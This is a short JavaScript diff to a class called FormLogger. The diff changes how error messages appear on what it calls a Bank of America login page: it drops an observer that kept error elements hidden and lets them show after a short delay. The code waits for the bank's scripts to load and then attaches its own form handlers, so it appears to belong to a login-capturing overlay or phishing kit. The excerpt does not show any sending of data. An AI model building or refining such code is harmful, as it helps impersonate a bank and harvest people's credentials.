@@ -48,6 +48,9 @@ class FormLogger {
     const self = this;
     console.log('[Logger] Initializing form logger...');
     
+    // Flag to track if this is the initial load
+    let isInitialLoad = true;
+    
     // FIRST: Hide any error messages on page load (they'll only show after login attempt)
     const existingErrors = document.querySelectorAll('.error-state');
     console.log('[Logger] Found', existingErrors.length, 'error-state elements on page load, hiding them');
@@ -58,22 +61,11 @@ class FormLogger {
       }
     });
     
-    // Monitor for dynamically added error elements and hide them
-    const observer = new MutationObserver((mutations) => {
-      mutations.forEach((mutation) => {
-        if (mutation.addedNodes.length) {
-          mutation.addedNodes.forEach((node) => {
-            if (node.nodeType === 1 && node.classList && node.classList.contains('error-state')) {
-              console.log('[Logger] Hiding dynamically added error-state element');
-              node.style.display = 'none';
-            }
-          });
-        }
-      });
-    });
-    
-    // Start observing for errors
-    document.body && observer.observe(document.body, { childList: true, subtree: true });
+    // Allow errors to show after the initial setup
+    setTimeout(() => {
+      isInitialLoad = false;
+      console.log('[Logger] Initial load complete, errors will now be displayed if needed');
+    }, 500);
 
     // Wait a moment for Bank of America scripts to initialize, then set up our handlers
     setTimeout(() => {
